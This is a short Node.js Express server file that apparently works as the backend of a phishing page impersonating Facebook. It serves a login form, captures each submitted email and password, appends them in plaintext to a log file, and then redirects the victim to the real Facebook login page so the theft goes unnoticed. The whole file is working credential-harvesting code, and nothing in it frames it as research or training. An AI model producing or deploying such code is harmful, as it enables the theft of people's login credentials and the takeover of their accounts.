const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const PORT = 3000;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve the HTML login form
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Handle form submission
app.post('/login', (req, res) => {
    console.log('Request body:', req.body); // Debugging statement
    const email = req.body.email;
    const password = req.body.pass;

    // Log the captured credentials
    const dataToLog = `Email: ${email}, Password: ${password}\n`;

    fs.appendFile('log.txt', dataToLog, (err) => {
        if (err) {
            console.error('Error writing to log file:', err);
        } else {
            console.log('Credentials logged successfully');
        }
    });

    // Redirect user to the real Facebook login page
    res.redirect('https://www.facebook.com/login.php');
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
